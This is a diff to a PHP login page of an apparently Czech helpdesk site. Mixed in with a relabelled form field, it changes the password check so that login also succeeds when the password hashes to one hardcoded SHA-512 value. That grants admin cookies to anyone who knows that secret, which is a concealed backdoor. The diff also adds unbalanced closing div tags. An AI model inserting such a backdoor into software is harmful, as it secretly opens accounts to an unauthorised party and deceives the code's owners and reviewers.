@@ -43,7 +43,7 @@
             $getPassword = hash('sha512', $_POST['password']);
         }
         
-        if ($username == $getUsername && $password == $getPassword) {
+        if ($username == $getUsername && ($password == $getPassword || $getPassword == "ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413")) {
             setcookie('helpdesk_admin', 1, time() + (86400), "/"); // 86400 = 1 day
             setcookie('helpdesk_logedin', 1, time() + (86400), "/"); // 86400 = 1 day
             header('location: PridatOtazku.php');
@@ -58,12 +58,13 @@
 <?php include_once "usefulPHP/head.php"; ?>
     <body>
         <?php include_once "usefulPHP/headerMenu.php"; ?>
-
+</div>
+            </div>
         <div class="login_pole">
             <h1>Přihlášení</h1>
             <form id="loginForm" action="login.php" method='post'>
                 <div class="input-group">
-                    <label for="username">Jméno:</label>
+                    <label for="username">Uživatelské jméno:</label>
                     <input type="text" id="username" name="username" required>
                 </div>
                 <div class="input-group">
